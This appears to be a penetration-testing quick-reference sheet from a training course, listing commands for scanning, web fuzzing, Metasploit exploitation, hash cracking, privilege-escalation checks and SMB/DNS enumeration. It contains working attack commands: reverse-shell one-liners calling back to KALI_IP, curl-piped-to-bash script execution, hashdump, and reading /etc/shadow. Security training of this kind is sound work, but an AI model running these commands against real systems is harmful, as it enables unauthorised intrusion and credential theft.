# 🛠️ Tools Quick Reference Cheat Sheet

> Fast reference for the most common tools used across all phases.
> For deeper docs, follow the links in each phase's README.

---

## Nmap

```bash
# Host discovery (ping sweep)
nmap -sn 192.168.56.0/24

# Common scan (version + default scripts)
nmap -sV -sC [TARGET]

# Full port scan (all 65535)
nmap -sS -p- [TARGET]

# UDP scan
nmap -sU --top-ports 100 [TARGET]

# Aggressive (OS + version + scripts + traceroute)
nmap -A [TARGET]

# Vulnerability scripts
nmap --script vuln [TARGET]

# Save all formats
nmap -sV -oA scan_name [TARGET]

# Specific NSE script
nmap --script smb-vuln-ms17-010 [TARGET]
```

---

## Burp Suite

| Task | How |
|------|-----|
| Intercept request | Proxy tab → Intercept ON |
| Replay/modify request | Right-click request → Send to Repeater |
| Fuzz parameters | Right-click → Send to Intruder → Positions |
| Scan for vulns | Right-click → Scan (Pro only; use manual for Community) |
| View all traffic | Proxy → HTTP History |
| Match/Replace | Proxy → Options → Match and Replace |

---

## ffuf

```bash
# Directory brute-force
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# With extensions
ffuf -u http://TARGET/FUZZ -w wordlist.txt -e .php,.html,.txt,.bak

# Subdomain fuzzing
ffuf -u http://FUZZ.target.com -H "Host: FUZZ.target.com" -w subdomains.txt

# Filter by response code
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fc 404

# Filter by response size
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fs 1234

# Save output
ffuf -u http://TARGET/FUZZ -w wordlist.txt -o results.json -of json
```

---

## Gobuster

```bash
# Directory mode
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt

# With extensions
gobuster dir -u http://TARGET -w wordlist.txt -x php,html,txt

# DNS subdomain mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHost mode
gobuster vhost -u http://TARGET -w subdomains.txt
```

---

## Netcat

```bash
# Listen for incoming connection
nc -lvnp 4444

# Connect to a host
nc [TARGET] [PORT]

# File transfer (receiver)
nc -lvnp 9999 > received_file

# File transfer (sender)
nc [TARGET] 9999 < file_to_send

# Banner grab
echo "" | nc [TARGET] [PORT]
```

---

## Metasploit

```bash
# Launch
msfconsole

# Search
search type:exploit name:vsftpd
search cve:2021-41773

# Use and configure
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS [TARGET]
set LHOST [YOUR_IP]
set LPORT 4444

# Run
exploit

# Sessions
sessions -l          # List sessions
sessions -i 1        # Interact with session 1
background           # Background current session

# Meterpreter commands
sysinfo
getuid
shell
hashdump
download /etc/passwd
upload payload.exe C:\\Windows\\Temp\\
```

---

## Password Cracking

```bash
# Identify hash type
hashid [HASH]
hash-identifier  # Interactive

# Hashcat — Dictionary attack
hashcat -m 0    hashes.txt rockyou.txt  # MD5
hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt rockyou.txt  # SHA-512
hashcat -m 3200 hashes.txt rockyou.txt  # bcrypt

# Hashcat — Rule-based
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 0 hashes.txt --show

# John the Ripper
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --show

# Combine passwd + shadow (Linux)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```

---

## Privilege Escalation

```bash
# ── Linux ──────────────────────────────────────────────────────────

# What can current user sudo?
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab && ls /etc/cron.*

# Kernel version (for exploit research)
uname -a

# Run LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash

# ── Windows ────────────────────────────────────────────────────────

# Current privileges
whoami /priv

# Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Run WinPEAS
.\winPEASx64.exe > winpeas_output.txt
```

---

## Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/KALI_IP/4444 0>&1

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("KALI_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (if -e flag available)
nc KALI_IP 4444 -e /bin/bash

# Generate with msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf > shell.elf

# Upgrade dumb shell to PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg
```

---

## SMB Enumeration

```bash
# List shares (null session)
smbclient -L //TARGET -N

# Connect to share
smbclient //TARGET/share -N

# Enum4linux
enum4linux -a TARGET

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users TARGET
nmap --script smb-vuln-ms17-010 TARGET
```

---

## DNS Enumeration

```bash
# Zone transfer
dig axfr @TARGET domain.com

# Subdomain brute-force
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnsrecon
dnsrecon -d domain.com -t axfr
dnsrecon -d domain.com -t brt -D subdomains.txt
```

---

## Key Wordlists (SecLists)

```bash
# Install SecLists
sudo apt install -y seclists

# Location: /usr/share/seclists/

# Common web content
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Subdomains
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# Usernames
/usr/share/seclists/Usernames/Names/names.txt
```

---

## Essential URLs

| Resource | URL |
|----------|-----|
| GTFOBins (Linux sudo/SUID exploits) | https://gtfobins.github.io |
| LOLBAS (Windows Living Off Land) | https://lolbas-project.github.io |
| HackTricks (huge reference) | https://book.hacktricks.xyz |
| RevShells Generator | https://www.revshells.com |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Exploit-DB | https://www.exploit-db.com |
| NVD (CVE search) | https://nvd.nist.gov |
| CVSS Calculator | https://www.first.org/cvss/calculator/3.1 |
| PortSwigger Academy | https://portswigger.net/web-security |
| CyberChef (decode/encode) | https://gchq.github.io/CyberChef/ |
| JWT.io | https://jwt.io |
